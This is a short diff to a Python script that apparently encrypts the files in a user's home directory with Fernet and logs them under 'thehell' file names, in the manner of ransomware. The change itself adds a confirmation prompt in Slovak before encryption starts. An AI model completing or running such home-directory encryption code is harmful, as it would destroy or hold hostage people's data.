@@ -15,6 +15,10 @@ SOURCE_DIR = f"/home/{USERNAME}/"
 ENCRYPTED_FILES_LOG = path.join(SOURCE_DIR, "thehell-encrypted-files.txt")
 TESTING_FILE = path.join(SOURCE_DIR, "thehell-enryption-test.txt")
 
+test = input(f"Si si istý {USERNAME}?? [y/N]")
+if test == "N" or test == "": 
+    exit()
+
 # encryption start
 
 def encrypt_file(file_path: str, key: fernet.Fernet):
